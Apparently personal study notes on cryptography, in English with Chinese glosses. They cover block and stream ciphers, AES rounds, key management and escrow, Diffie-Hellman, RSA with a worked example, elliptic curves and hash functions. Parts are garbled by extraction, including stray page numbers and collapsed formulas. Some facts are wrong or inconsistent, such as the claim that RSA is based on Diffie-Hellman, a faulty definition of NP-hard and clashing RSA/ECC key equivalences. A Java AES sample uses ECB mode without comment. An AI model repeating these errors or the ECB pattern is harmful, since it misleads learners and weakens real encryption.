- However, it extends IDEA’s key strength even further by allowing the use of variable-length keys, ranging from insecure 32 bits to extremely strong 448 bits.
- Obviously, the longer keys will result in a corresponding increase in encryption/decryption time.
- Blowfish faster than both IDEA and DES in some instances.
  - Part of the reason is that Blowfish encrypts data in smaller 64-bit
blocks, AES encrypts data in 128-bit blocks. - Mr. Schneier released Blowfish for public use with no license required.
- Blowfish encryption is built into a number of commercial software products and operating systems.
- A number of Blowfish libraries are also available for software developers.
http://wemedia.ifeng.com/76674795/wemedia.shtml
https://my.oschina.net/u/3664884/blog/1607425
https://blog.csdn.net/findmyself_for_world/article/details/50222081
http://blog.51cto.com/yinghao/563302
Twofish
The Twofish algorithm developed by Bruce Schneier (also the creator of Blowfish) was another one of the AES finalists.
- a block cipher.
- related to Blowfish, but encrypts data in 128-bit blocks
- supports 128-, 192-, or 256-bit keys.
- It was one of the finalist algorithms evaluated by NIST for AES.
- However, NIST selected Rijndael as AES instead.
Twofish uses two techniques not found in other algorithms:
- Prewhitening involves XORing the plain text with a separate subkey before the first round of encryption.
     - Postwhitening uses a similar operation after the 16th round of encryption.
Skipjack
The Skipjack algorithm was approved for use by the US government in Federal Information Processing Standard (FIPS) 185, the Escrowed Encryption Standard (EES).
- block ciphers
- 64-bit blocks of text.
- 80-bit key
- supports the same 4 modes of operation supported by DES.
- Skipjack was quickly embraced by the US government and provides the cryptographic routines supporting the Clipper and Capstone encryption chips.
However, Skipjack has an added twist—it supports the escrow of encryption keys.
- Two government agencies, the National Institute of Standards and Technology (NIST) and the Department of the Treasury, hold a portion of the information required to reconstruct a Skipjack key.
- When law enforcement authorities obtain legal authorization, they contact the two agencies, obtain the pieces of the key, and are able to decrypt communications between the affected parties.
- Skipjack and the Clipper chip not used by the cryptographic community at large because of its mistrust不信任 of the escrow procedures in place within the US government.
RC4
Ron Rivest invented several versions of RC, which are sometimes referred to as Ron’s Code or Rivest Cipher. The most commonly used version is RC4 (ARC4)
- a symmetric stream cipher
▪
- can use between 40 and 2,048 bits.
- enjoyed a long life as a strong cipher.
  - For many years, it has been the recommended encryption mechanism in SSL and TLS, when encrypting HTTPS connections on the Internet.
- However, experts have speculated since 2013 that agencies such as the U.S. National Security Agency (NSA) can break RC4, even when implemented correctly such as in TLS.
- Because of this, companies such as Microsoft recommend disabling RC4 and using AES instead.
- Even though AES is a block cipher and RC4 is a stream cipher, TLS can implement either one.
RC5 Rivest Cipher 5
a symmetric algorithm
patented by Rivest, Shamir, and Adleman (RSA) Data Security, the people who developed the RSA asymmetric algorithm.
- a block cipher
- variable block sizes (32, 64, or 128 bits)
- uses key sizes between 0 length and 2,040 bits.
- faster, larger key size.
RC6
- cipher derived from RC5.
The Advanced Encryption Standard (AES)
 optimized for confidential communications, like
bidirectional voice and video - 1997, the U.S. National Institute for Standards and Technology (NIST) want replace DES. five finalists, and ultimately chose Advanced Encryption Standard (AES).
- In October 2000, the National Institute of Standards and Technology (NIST) announced that the Rijndael block cipher had been chosen as the replacement for DES.
- In November 2001, NIST released FIPS 197, which mandated the use of AES/Rijndael for the encryption of all sensitive but unclassified data by the US government.
Advanced Encryption Standard (AES)
- a strong symmetric block cipher that encrypts data in 128-bit blocks.
- AES key sizes: 128 bits, 192 bits, or 256 bits, (AES-128, AES-192, or AES-256)
- When more bits are used, more difficult to discover the key and decrypt the data. Longer keys for a specific algorithm result in stronger key strength.
- Because of its strengths, AES has been adopted in a wide assortment of applications.
  - example, many applications that encrypt data on USB drives use AES. - strengths of AES:
  - Fast:
  - uses elegant mathematical formulas and only requires one pass to
encrypt and decrypt data.
  - In contrast, 3DES requires multiple passes to encrypt and decrypt data.
  - Efficient
  - less resource intensive than other encryption algorithms such as 3DES.   - AES encrypts and decrypts quickly even when ciphering data on small devices, such as USB flash drives.
  - Strong:
  - trong encryption of data, high level of confidentiality.
AES only allows the processing of 128-bit blocks, but Rijndael exceeded this specification, allowing cryptographers to use a block size equal to the key length.
128-bit keys require 10 rounds of encryption. 192-bit keys require 12 rounds of encryption. 256-bit keys require 14 rounds of encryption.
- Plain and cipher text, same size.
 AES Round Structure The 128-bit version of the AES encryption algorithm proceeds in ten rounds. Each round performs an invertible transformation on a 128-bit array, called state.
The initial state X0 is the XOR of the plaintext P with the key K: X0 = P XOR K. The ciphertext C is the output of the final round: C = X10. Each round is built from 4 basic steps:
1. SubBytes step: an S-box substitution step. 2. ShiftRows step: a permutation step.
3. MixColumns step: a matrix multiplication 矩阵乘法 step.
4. AddRoundKey step: an XOR step with a round key derived from the 128-bit encryption key.
Java AES Encryption Example
Source: http://java.sun.com/javase/6/docs/technotes/guides/security/crypto/ CryptoSpec.html
Generate an AES key
KeyGenerator keygen = KeyGenerator.getInstance("AES"); SecretKey aesKey = keygen.generateKey();
Create a cipher object for AES in ECB mode and PKCS5 padding
  - Cipher aesCipher;
aesCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
Encrypt :
  - aesCipher.init(Cipher.ENCRYPT_MODE, aesKey);
  - byte[] plaintext = "My secret message".getBytes();
  - byte[] ciphertext = aesCipher.doFinal(plaintext);
Decrypt
  - aesCipher.init(Cipher.DECRYPT_MODE, aesKey);
  - byte[] plaintext1 = aesCipher.doFinal(ciphertext);
Stream Cipher
- Key stream
  - 冒充的 Pseudo-random sequence of bits S = S[0], S[1], S[2], ...
  - Can be generated on-line, one bit (or byte) at the time. - Stream cipher
  - encrypts data as a stream of bits or bytes rather than dividing it into
blocks.
  - XOR the plaintext with the key stream: C[i] = S[i] XOR P[i]
  - Suitable for plaintext of arbitrary 随意的 length generated on the fly,
e.g., media
stream.
- Stream ciphers: one letter by one letter
- Example:
  - The Caesar cipher.
  - The one-time pad: the algorithm operates on each letter of the plaintext message independently.
- Stream ciphers can also function as a type of block cipher: there is a buffer that fills up to real-time data that is then encrypted as a block and transmitted to the recipient.
- Synchronous stream cipher
  - Key stream obtained only from the secret key K.
  - Works for unreliable channels if plaintext has packets with sequence
numbers.
- Self-synchronizing 自同步 stream cipher
  - Key stream obtained from the secret key and q previous ciphertexts.
  - Lost packets cause a delay of q steps before decryption resumes.
Block vs Stream Ciphers stream ciphers are less efficient than block ciphers
- when the size of the data is unknown or sent in a continuous stream
- such as streaming audio, video over a network.
Block ciphers are more efficient
- when the size of the data is known
- such as a file or a specific-sized database field.
An important principle when using a stream cipher is that encryption keys should never be reused.
If a key is reused, it is easier to crack the encryption.
Key Stream Generation
流密码的基本思想是产生一个密钥流，一次对一位或一字节加密。 相比分组密码，流密码的主要优点是速度更快而且需要编写的代码更少。 流密码目前主要还是应用在军事、外交、无线通信等领域。主要的算法有 RC4，A5，SEAL 和 PIKE 等。
- RC4
– Designed in 1987 by Ron Rivest for RSA Security – Trade secret until 1994
– Uses keys with up to 2,048 bits
– Simple algorithm
- Block cipher in counter mode (CTR)
– Use a block cipher with block size b
– The secret key is a pair (K,t), where K a is key and t (counter) is a b-bit value
– The key stream is the concatenation of ciphertexts
EK (t), EK (t + 1), EK (t + 2), ...
– Can use a shorter counter concatenated with a random value – Synchronous stream cipher
Attacks on Stream Ciphers
Repetition attack
  - if key stream reused, attacker obtains XOR of two plaintexts
Insertion attack [Bayer Metzger, TODS 1976]
  - retransmission of the plaintext with
  - a chosen byte inserted by attacker
  - using the same key stream
  - e.g.,email message resent with new message number
Symmetric Key Management
cryptographic keys contain information essential to the security of the cryptosystem, it is incumbent 义不容辞的 to take extraordinary measures to protect the security of the keying material.
- These security measures are collectively known as key management practices.
- They include safeguards surrounding the creation, distribution, storage, 3,287

destruction, recovery, and escrow of secret keys.
- keys should be stored and transmitted by secure means to avoid interception
by any unauthorized entity.
- keys should be generated by a pseudorandom process. (Not picked up by entity)
- ket’s life time should correspond with the sensitivity of the data. (More sensitive, shorter key lifetime)
- keys should be properly destroyed.
Creation and Distribution of Symmetric Keys
As previously mentioned, one of the major problems underlying symmetric encryption algorithms is the secure distribution of the secret keys required to operate the algorithms.
The 3 main methods used to exchange secret keys securely are: offline distribution,
public key encryption,
the Diffie-Hellman key exchange algorithm.
Offline Distribution:
The most simple method, physical exchange of key material.
One party provides the other party with paper or storage media containing the
secret key.
In many hardware encryption devices, this key material comes in the form of an electronic device that resembles an actual key that is inserted into the encryption device.
However, every offline key distribution method has its own inherent flaws.
  - If keying material is sent through the mail, it might be intercepted.
  - Telephones can be wiretapped.
  - Papers might be inadvertently thrown in the trash or lost.
Public Key Encryption:
obtain the speed benefits of secret key encryption without the hassles of key
distribution.
For this reason, many people use public key encryption to set up an initial
communications link.
Once the link is successfully established and the parties are satisfied as to each
other’s identity, they exchange a secret key over the secure public key link. They then switch communications from the public key algorithm to the secret
key algorithm and enjoy the increased processing speed.
  - secret key encryption is thousands of times faster than public key
encryption.
Diffie-Hellman:
represented a major advance in cryptographic science when released in 1976. It’s still in use today.
When neither public key encryption nor offline distribution is sufficient.
  - Two parties might need to communicate with each other, but no physical means to exchange key material, and no public key infrastructure in place to facilitate the exchange of secret keys. extremely useful mechanisms.
  - Secure RPC (S-RPC) employs Diffie-Hellman for key exchange.
The algorithm works as follows:
1. The communicating parties agree on two large numbers:
p (a prime number) and g (an integer): 1 < g < p.
2. A chooses a random large integer r and performs the following calculation:
R = g^r mod p
3. B chooses a random large integer s and performs the following calculation: S = g^s mod p
4. A sends R to B, B sends S to A.
5. A then performs the following calculation:
K = S^r mod p
6. Sue then performs the following calculation:
K = R^s mod p
7. At this point, A and B both have the same value, K
8. use this for secret key communication between the two parties.
Storage and Destruction of Symmetric Keys
Another major challenge with the use of symmetric key cryptography is that all of the keys used in the cryptosystem must be kept secure.
Following best practices surrounding the storage of encryption keys: Never store an encryption key on the same system where encrypted data resides. This just makes it easier for the attacker!
split knowledge: For sensitive keys, consider providing two different individuals with half of the key. They then must collaborate to recreate the entire key.
When a user with knowledge of a secret key is no longer permitted access to material protected with that key, the keys must be changed and all encrypted materials must be reencrypted with the new keys.
  - The difficulty of destroying a key to remove a user from a symmetric cryptosystem is one of the main reasons organizations turn to asymmetric algorithms.
Key Escrow and Recovery
Cryptography can also be used with malicious intent.
To gain a handle on the explosive growth of cryptographic technologies, governments around the world have floated ideas to implement key escrow systems.
- These systems allow the government, under limited circumstances such as a court order, to obtain the cryptographic key used for a particular communication from a central storage facility.
- placing a copy of a private key in a safe environment.
- useful for recovery
  - If the original is lost, the organization retrieves the copy of the key to access the data.
  - isn’t required, if an organization determines that data loss is unacceptable, it will implement a key escrow process. 2 major approaches to key escrow that have been proposed over the past decade:
- Fair Cryptosystems:
  - the secret keys used in communication are divided into pieces, each of which is given to an independent third party.
  - Each of these pieces is useless on its own but may be recombined to obtain the secret key.
  - When the government obtains legal authority to access a particular key, it provides evidence of the court order to each of the third parties and then reassembles the secret key.
- Escrowed Encryption Standard:
  - provides the government with a technological means to decrypt ciphertext.
  - This standard is the basis behind the Skipjack algorithm.
- Another method is to designate employees within the organization who will be
responsible for key escrow.
  - These employees maintain and protect copies of the key, and if the original key is lost, they check out a copy ofthe key to an administrator or user.
It’s highly unlikely that government regulators will ever overcome the legal and privacy hurdles necessary to implement key escrow on a widespread basis.
The technology is certainly available, but the general public will likely never accept the potential government intrusiveness it facilitates.
Recovery Agent
A key recovery agent is a designated individual who can recover or restore cryptographic keys.
- In the context of a PKI, a recovery agent can recover private keys to access encrypted data.
- The recovery agent may be a security professional, administrator, or anyone designated by the company.
In some cases, the recovery agent can recover encrypted data using a different key.
- Example
- Microsoft BitLocker
- supports encryption of entire drives.
- It’s possible to add a data recovery agent field when creating a BitLocker encrypted drive.
- In this case, BitLocker uses two keys.
- The user has one key and uses it to unlock the drive during day-to-day use.
- The second key is only accessible by the recovery agent and is used for recovery purposes if the original key is lost or becomes inaccessible.
Cryptographic Life Cycle
With the exception of the one-time pad, all cryptographic systems have a limited life span. Moore’s law, a commonly cited trend in the advancement of computing power, states that the processing capabilities of a state-of-the-art microprocessor will double approximately every two years.
This means that, eventually, processors will reach the amount of strength required to simply guess the encryption keys used for a communication.
Security professionals must keep this cryptographic life cycle in mind when selecting an encryption algorithm and have appropriate governance controls in place to ensure that the algorithms, protocols, and key lengths selected are sufficient to preserve the integrity of a cryptosystem for however long it is necessary to keep the information it is protecting secret.
Security professionals can use the following algorithm and protocol governance controls:
Specifying the cryptographic algorithms (like AES, 3DES, and RSA) acceptable for use in an organization
Identifying the acceptable key lengths for use with each algorithm based on the sensitivity of information transmitted
Enumerating the secure transaction protocols (such as SSL and TLS) that may be used
example, if you’re designing a cryptographic system to protect the security of business plans that you expect to execute next week, you don’t need to worry about the theoretical risk that a processor capable of decrypting them might be developed a decade from now. On the other hand, if you’re protecting the confidentiality of information that could be used to construct a nuclear bomb, it’s virtually certain that you’ll still want that information to remain secret 10 years in the future!
Asymmetric Encryption
- also called Public-Key Encryption.
  - Two-key systems are referred to as public key cryptography
(PKC)
- In 1976, Whitfield Diffie and Martin R. Hellman published the first public key exchange protocol
- Asymmetric key cryptography relies on NP-hard problem:
  - a math problem is considered NP-hard if it cannot be solved in polynomial time.
  - X^2, X^3, NP-hard problem: 2^X.
- Asymmetric cryptography relies on types of problem that are relatively easy to solve one way but are extremely difficult to solve the other way. (Trapdoor function)
  - 233x347=80851
  - 80851=?x? (Hard)
- adders the most serious problem of symmetric encryption: key distribution.
  - no fear of authorized key disclosure.
disadvantage:
- very strong, but very resource intensive.
  - It takes a significant amount of processing power to encrypt and decrypt data, especially when compared with symmetric encryption.
- higher security but slower:
  - not for large quantities of real-time data.
  - might be used to encrypt a small chunk of data. - Most cryptographic protocols use asymmetric encryption only for key exchange.
  -   - ⁃
Key exchange: share cryptographic keys between two entities.
use asymmetric encryption to key exchange, share a symmetric key.
uses the symmetric encryption to encrypt and decrypt data (much more efficient).
- uses asymmetric (different) keys for the sender and the receiver.
  - C = EPB (M)
  - M = DSB (C)
⁃
  - communication among n users, n distinct private/public key
pairs are needed.
- Once the sender encrypts the message with the recipient’s public key, no user (including the sender) can decrypt that message without knowing the recipient’s private key.
  - public keys can be freely shared using unsecured communications
  - create secure communications between users previously unknown to each other.
- public key cryptography entails a higher degree of computational 3,296

complexity. Keys must be longer than those used in private key systems to produce cryptosystems of equivalent strengths.
- example:
  - authenticate the other party in a conversation
  - or to exchange a shared key to be used during a session (after which, the parties in the conversation could start using symmetric encryption).
Popular asymmetric encryption algorithms:   - RSA:
⁃
▸ inventors: Ronald L. Rivest, Adi Shamir, and Leonard M. Adleman.
▸ commonly used as part of a public key infrastructure (PKI) system.
- PKI uses digital certificates and a certificate authority (CA) to allow secure communication across a public network.
pretty good privacy (PGP):
▸ often used to encrypt e-mail traffic. A free variant of PGP is GNU Privacy Guard (GPC).
example:
when client A wants to communicate securely with server 1.
  - Client A requests server 1’s digital certificate.
  - Server 1 sends its digital certificate,
  - client A knows the received certificate is really from server 1.
▸ because the certificate has been authenticated (signed) by a trusted third party, called a certificate authority.   - Client A extracts 提取 server 1’s public key from server 1’s digital certificate.
▸ Data encrypted using server 1’s public key can only be decrypted with server 1’s private key.
  - Client A generates a random string of data called a session key.
▸ The session key is then encrypted using server 1’s public key and sent to server 1.
  - Server 1 decrypts the session key using its private key.
At this point, both client A and server 1 know the session key, use it to
symmetrically encrypt traffic during the session. Disadvantages:
  - much slower than the those for existing symmetric encryption schemes.
  - Require in practice a key length larger than that for symmetric cryptosystems.
▸ RSA: 2, 048-bit keys ▸ AES: 256-bit keys.   major strengths of asymmetric key cryptography:
- The addition of new users requires the generation of only one public-private key
pair. This makes the algorithm extremely scalable.
- Users can be removed far more easily from asymmetric systems. Asymmetric cryptosystems provide a key revocation mechanism that allows a key to be canceled, effectively removing a user from the system.
- Key regeneration is required only when a user’s private key is compromised. If a user leaves the community, the system administrator simply needs to invalidate that user’s keys. No other keys are compromised, therefore key regeneration is not required for any other user.
- Asymmetric key encryption can provide integrity, authentication, and nonrepudiation. If a user does not share their private key with other individuals, a message signed by that user can be shown to be accurate and from a specific source and cannot be later repudiated.
- Key distribution is a simple process. Users who want to participate in the system simply make their public key available to anyone with whom they want to communicate. There is no method the private key can be derived from the public key.
- No preexisting communication link needs to exist. Two individuals can begin communicating securely from the moment they start communicating. Asymmetric cryptography does not require a preexisting relationship to provide a secure mechanism for data exchange.
The major weakness of public key cryptography: its slow speed of operation.
- For this reason, many applications that require the secure transmission of large amounts of data use public key cryptography to establish a connection and then exchange a symmetric secret key.
- The remainder of the session then uses symmetric cryptography. Static vs Ephemeral Keys
The two primary categories of asymmetric keys are static and ephemeral 短暂的.
- static key: semipermanent and stays the same over a long period of time.
  - RSA uses static keys.
  - A certificate includes an embedded public key matched to a private key and this key pair is valid for the lifetime of a certificate, such as a year.
  - Certificates have expiration dates and systems continue to use these keys until the certificate expires.
  - A benefit of static keys is that a CA can validate them.
- ephemeral key: has a very short lifetime and is re-created for each session.
  - An ephemeral key pair includes a private ephemeral key and a public
ephemeral key.
  - However, systems use these key pairs for a single session and then
discard them.
Perfect forward secrecy
- an important characteristic that ephemeral keys comply with in asymmetric encryption.
- indicates that a cryptographic system generates random public keys for each session, doesn’t use a deterministic algorithm to do so.
  - given the same input, the algorithm will create a different public key.
- helps ensure that systems do not reuse keys.
- The result is that the compromise of a long-term key does not compromise
anypast keys.
- Some versions of Diffie-Hellman use static keys and some versions use ephemeral keys. Diffie-Hellman (DH)
- a key exchange algorithm
- to privately share a symmetric key between two parties.
- Once the two parties know the symmetric key, they use symmetric encryption to encrypt the data.
Whitfield Diffie and Martin Hellman first published the Diffie-Hellman scheme in 1976.
- Interestingly, Malcolm J. Williamson secretly created a similar algorithm while working in a British intelligence agency. It is widely believed that the work of these three provided the basis for public-key cryptography.
Diffie-Hellman methods
- uses large integers and modular arithmetic
- support both static keys and ephemeral keys.
- RSA is based on the Diffie-Hellman key exchange concepts using static keys.
- Two Diffie-Hellman methods that use ephemeral keysare:
  - Diffie-Hellman Ephemeral (DHE):
  - uses ephemeral keys, generating different keys for each session. Some
documents list this as Ephemeral Diffie-Hellman (EDH).
  - Elliptic Curve Diffie-Hellman Ephemeral (ECDHE)
  - uses ephemeral keys generated using ECC.
  - Another version, Elliptic Curve Diffie-Hellman (ECDH), uses static keys.
When Diffie-Hellman is used, the two parties negotiate the strongest group that both parties support.
- There are currently more than 25 DH (Diffie Hellman) groups in use
- defined as DH Group 1, DH Group 2, and so on.
- Higher group more secure.
- Example
  - DH Group 1 uses 768 bits in the key exchange process
  - DH Group 15 uses 3,072 bits.
El Gamal
Diffie-Hellman: uses large integers and modular arithmetic to facilitate the secure exchange of secret keys over insecure communications channels.
- el Gamal: based on Diffie-Hellman, relies on discrete logarithms.
In 1985, Dr. T. El Gamal published an article describing how the mathematical principles behind the Diffie-Hellman key exchange algorithm could be extended to support an entire public key cryptosystem used for encrypting/decrypting messages.
- when release, one of the major advantages of El Gamal over the RSA algorithm: it was released into the public domain.
- Dr. El Gamal did not obtain a patent on his extension of Diffie-Hellman, and it is freely available for use, unlike the then-patented RSA technology. (RSA released its algorithm into the public domain in 2000.)
Major disadvantage:
- the algorithm doubles the length of any message it encrypts.
- Hard when encrypting long messages/data then transmitte over a narrow ▪


## bandwidth communications circuit.
RSA Cryptosystem
inventors: Ronald L. Rivest, Adi Shamir, and Leonard M. Adleman.
They patented their algorithm and formed a commercial
venture known as RSA Security to develop mainstream implementations of their security technology.
early public key encryption system that uses large integers as the basis for the process
patented in 1977, released its patent to the public about 48 hours before it expired in 2002.
RSA algorithm:
asymmetric encryption
based on factoring 2 larger primes.
security backbone of many well-known security infrastructures: Microsoft, Nokia, and Cisco.
RSA works with both encryption and digital signatures, used
in many environments, like Secure Sockets Layer (SSL), and key exchange.
  - commonly used as part of a public key infrastructure (PKI) system.
  - But ECDH better in PKI for key agreement.
  - PKI uses digital certificates and a certificate authority (CA) to allow secure communication across a public network.
The RSA algorithm depends on the computational difficulty
       inherent in factoring large prime numbers.
- The RSA algorithm uses the mathematical properties of prime
numbers to generate secure public and private keys.
- RSA relies on the fact that it is difficult to factor the product
of two large prime numbers.
- RSA is secure if sufficient key sizes are used.
  - RSA laboratories recommend a key size of 2,048 bits to protect data through the year 2030.
  - If data needs to be protected beyond 2030, they recommend a key size of 3,072 bits.
 a 除以 m 所得的余数记作 a mod m.
如果 a mod m = b mod m
 即 a, b 除以 m 所得的余数相等，那么我们记作:a≡b(mod m)
1. Choose two large prime numbers p,q (approximately 200 digits each): p and q, of approximately equal size such that their product, n = pq, is of the required bit length (such as 2,048 bits, 4,096 bits, and so forth).
2. Compute the product of those two numbers: a. n=p*q.
b. m = (p-1)(q-1)
3. Select a number, e, that satisfies the following two requirements:
a. e<n.
b. e co-prime to m. (2 numbers have no common
factors other than 1.)
4. Find d:
a. (ed–1)mod(p–1)(q–1)=0.
b. demodm≡1
5. Distribute e and n as the public key to all cryptosystem
users.
6. Keep d secret as the private key. If Alice wants to send an encrypted message to Bob, Alice generates the ciphertext (C) from the plain text (P):
  - C=P^e mod n
  - e is Bob’s public key
  - n is the product of p and q created during the key
generation process
When Bob receives the message, he retrieve the plaintext
message:
  - P=Cdmodn
https://www.youtube.com/watch?v=wXB-V_Keiu8
To make this even more clear, let’s look at an example:
1. Select primes: p = 17 and q =11
2. Compute n = pq =17×11 = 187
3. Compute ø(n) = (p–1)(q-1) = 16×10 = 160
4. Selecte=7
5. Findd,suchthatdemodm≡1,d=23
6. Since23×7=161modM(160)=1
7. Publish public key 7
8. Keep secret private key 23
9. Now let’s use these keys. Use the number 3 as the plain
text. Remember e = 7, d = 23, and n = 187.
10. Cipher text = Plaintexte mod n = 37 mod 187 = 2187 mod 187 = 130
11. Plaintext = Cipher textd mod n
Plaintext = 13023 mod 187
Plaintext = 4.1753905413413116367045797e+48mod 187
12. Plaintext = 3
   Elliptic Curve
Also in 1985, Neal Koblitz from the University of Washington and Victor Miller from IBM, independently proposed the application of elliptic curve cryptography (ECC) theory to develop secure cryptographic systems.
- based on the difficulty of solving the elliptic curve discrete logarithm problem.
- the algorithm is so computationally intensive, shorter key lengths offer better security relative to other algorithms using the same key length.
- shorter keys require less power and memory to operate as other cryptographic methods.
  - common use on device with less processor or low-power. small wireless devices.
  - 1,024-bit RSA key = 160-bit elliptic curve cryptosystem key.
- The U.S. NSA previously endorsed the use of ECC for digital signatures and Diffie-Hellman key agreements.
- But announced in late 2015 to move away from its use, deprecated the use of various ECC versions for government agencies.
It uses mathematical equations to formulate an elliptical curve. It then graphs points on the curve to create keys. This is mathematically easier and requires less processing power, while also being more difficult to crack.
Any elliptic curve can be defined by the following equation:
y2 = x3 + ax + b
- x, y, a, and b are all real numbers.
- Each elliptic curve has a corresponding elliptic curve group made up of the
points on the elliptic curve along with the point O, located at infinity.
Two points within the same elliptic curve group (P and Q) can be added together with an elliptic curve addition algorithm. This operation is expressed, quite simply, as follows:
P +Q
This problem can be extended to involve multiplication by assuming that Q is a
multiple of P : Q = xP
Computer scientists and mathematicians believe that it is extremely hard to find x, even if P and Q are already known.
- This difficult problem, known as the elliptic curve discrete 分离的 logarithm problem, forms the basis of elliptic curve cryptography.
- It is widely believed that this problem is harder to solve than both the prime factorization problem that the RSA cryptosystem is based on and the standard discrete logarithm problem utilized by Diffie- Hellman and El Gamal.
- a 1,088-bit RSA key is cryptographically equivalent to a 160-bit elliptic curve cryptosystem key.
The Rayburn Box
A Rayburn box:
- a lockbox that allows people to securely transfer items over long distances.
- It has two keys.
- One key can lock the box, but can’t unlock it.
- The other key can unlock the box, but can’t lock it.
- Both keys are matched to one box and won’t work with other boxes:
- Only one copy of one key exists—private key.
- Multiple copies of the other key exist, and copies are freely made and
distributed—public keys.
The box comes in two different versions.
- In one version, it’s used to send secrets in a confidential manner to prevent unauthorized disclosure.
- In the other version, it’s used to send messages with authentication, so you
know the sender sent the message and that the message wasn’t modified in transit.
Merkle-Hellman Knapsack
Another early asymmetric algorithm, developed the year after RSA was publicized. Like RSA, it’s based on the difficulty of performing factoring operations,
  - but it relies on a component of set theory known as super-increasing sets rather than on large prime numbers.
  - Merkle-Hellman was proven ineffective when it was broken in 1984.
The length of the cryptographic key is perhaps the most important security parameter that can be set at the discretion of the security administrator.
It’s important to understand the capabilities of your encryption algorithm and choose a key length that provides an appropriate level of protection. This judgment can be made by weighing the difficulty of defeating a given key length (measured in the amount of processing time required to defeat the cryptosystem) against the importance of the data.
Generally speaking, the more critical your data, the stronger the key you use to protect it should be.
Timeliness of the data is also an important consideration. You must take into account the rapid growth of computing power—Moore’s law suggests that computing power doubles approximately every 18 months. If it takes current computers one year of processing time to break your code, it will take only three months if the attempt is made with contemporary technology three years down the road. If you expect that your data will still be sensitive at that time, you should choose a much longer cryptographic key that will remain secure well into the future.
The strengths of various key lengths also vary greatly according to the cryptosystem you’re using. The key lengths shown in the following table for three asymmetric cryptosystems all provide equal protection:
 Asymmetric Key Management
When working within the public key infrastructure, it’s important that you comply with several best practice requirements to maintain the security of your communications.
- choose your encryption system wisely. “security through obscurity” is not an appropriate approach. Choose an encryption system with an algorithm in the public domain that has been thoroughly vetted 审查 by industry experts.   - Be wary of systems that use a “black-box” approach and maintain that the secrecy of their algorithm is critical to the integrity of the cryptosystem.
- select your keys in an appropriate manner.
  - Use a key length that balances your security requirements with
performance considerations.
  - ensure that your key is truly random. Any patterns within the key increase the likelihood that an attacker will be able to break your encryption and degrade the security of your cryptosystem.
- When using public key encryption, keep your private key secret!
  - Do not, under any circumstances, allow anyone else to gain access to your private key. Allowing someone access even once permanently compromises all communications that take place (past, present, or future) using that key and allows the third party to successfully impersonate you.
- Retire keys when they’ve served a useful life. Many organizations have mandatory key rotation requirements to protect against undetected key compromise. If you don’t have a formal policy that you must follow, select an appropriate interval based on the frequency with which you use your key. You might want to change your key pair every few months, if practical.
- Back up your key! You may want to either create your own backup or use a key escrow service that maintains the backup for you.
Hashing Algorithms
Hashing:
- verify integrity with hashing.
- an algorithm performed on data to produce a number called a hash (checksum). - Hash:
  - conjunction with a message digest, public key cryptosystems can
provide digital signature capability.
  - Message digests are summaries of a message’s content (not unlike a
file checksum) produced by a hashing algorithm.
- Common uses:
  - store computer passwords.
  - ensure message integrity. use to verify that data is not modified,
tampered, or corrupted. verify has maintained integrity.
  - created twice and compared
  - Patch file. Patch_v2_3.zip
  - SHA-1 checksum:
  - d4723ac6f72daea2c7793ac113863c5082644229
  - Secure Hash Algorithm 1 (SHA-1) checksum is in
hexadecimal.
  - If hash is the same, the file has retained integrity.
- A key point: hash will always be the same for the same data.
- one-way: not reversible, extremely difficult or impossible, to derive a
message from an ideal hash function.
- Variable-length input produces fixed-length output: hash two characters or two million, the output hash size is the same.
   - Important step before moving any installation packages from a test environment to production. - few or no collisions: two messages will not produce the same hash value.
  - Collision: 2 different inputs to a hashing algorithm produce the same
output.
  - Modern hashing algorithms are designed to make this less likely.
  - However, basic logic should tell you that if a given hash has a 160-bit output (like SHA1) and you put in 2160 +1 separate inputs, the last one must have a collision with one of the preceding inputs.
  - Don’t be too concerned; 2160 is a very large number:1.4615016373309029182036848327163e+48.
The following are some of the more common hashing algorithms in use today:
Message Digest (MD)
  - Message Digest 2 (MD2)
  - Message Digest 5 (MD5) Secure Hash Algorithm (SHA)
  - SHA-1
  - SHA-2 (-224, -256, -384, -512)
  - SHA-3
Hashed Message Authentication Code (HMAC)
  - a special subset of hashing technology.
  - can provide integrity simultaneously with authentication.    Hash Functions
Later in this chapter, you’ll learn how cryptosystems implement digital signatures to provide proof that a message originated from a particular user of the cryptosystem and to ensure that the message was not modified while in transit between the two parties. Before completely understand that concept, first explain the concept of hash functions.
Hash functions: take a potentially long message and generate a unique output value derived (message digest) from the content of the message.
- Message digests can be generated by the sender of a message and transmitted to the recipient along with the full message for two reasons.
- First, the recipient use the same hash function to recompute the message digest from the full message, compare the computed message digest to the transmitted one to ensure that the message sent by the originator is the same one received by the recipient. If the message digests do not match, that means the message was somehow modified while in transit.
- Second, the message digest can be used to implement a digital signature algorithm “Digital Signatures”.
- message digest: used interchangeably with a wide variety of synonyms, including hash, hash value, hash total, CRC, fingerprint, check- sum, and digital ID.
- In most cases, a message digest is 128 bits or larger. However, a single-digit value can be used to perform the function of parity, a low-level or single- digit checksum value used to provide a single individual point of verification. In most cases, the longer the message digest, the more reliable its verification of integrity.
According to RSA Security, there are 5 basic requirements for cryptographic hash function:
- The input can be of any length.
- The output has a fixed length. - The hash function is relatively easy to compute for any input.
- The hash function is one-way (extremely hard to determine the input when provided with the output). One-way functions and their usefulness in cryptography are described in Chapter 6.
- The hash function is collision free (meaning that it is extremely hard to find two messages that produce the same hash value).
There are numerous hashing algorithms: SHA, MD2, MD4, MD5, and HMAC, HAVAL.
- Hash of Variable Length (HAVAL) is a modification of MD5.
- HA V AL uses 1,024-bit blocks
- produces hash values of 128, 160, 192, 224, and 256 bits.
MD2 Message Digest 2
developed by Ronald Rivest (the same Rivest of Rivest, Shamir, and Adleman
fame) in 1989 to provide a secure hash function for 8-bit processors.
MD2 pads the message so that its length is a multiple of 16 bytes.
It then computes a 16-byte checksum and appends it to the end of the message.
A 128-bit message digest is then generated by using the entire original message along with the appended checksum.
MD5 is the newest version of the algorithm.
  - produces a 128-bit hash
  - more complex than its predecessors, offers greater security.
biggest weakness:
  - does not have strong collision resistance   - no longer recommended
  - SHA (1 or 2) are the recommended alternatives.
Cryptanalytic attacks exist against the MD2 algorithm.
Nathalie Rogier and Pascal Chauvaud discovered that if the checksum is not appended to the message before digest computation, collisions may occur.
Frederic Mueller later proved that MD2 is not a one-way function. Therefore, it should no longer be used.
MD4 Message Digest 4
In 1990, Rivest enhanced MD2 to support 32-bit processors and increase the
level of security.
It first pads the message to ensure that the message length is 64 bits smaller than a multiple of 512 bits.
  - example: a 16-bit message, padded with 432 additional bits of data to make it 448 bits, then is 64 bits smaller than a 512-bit message.
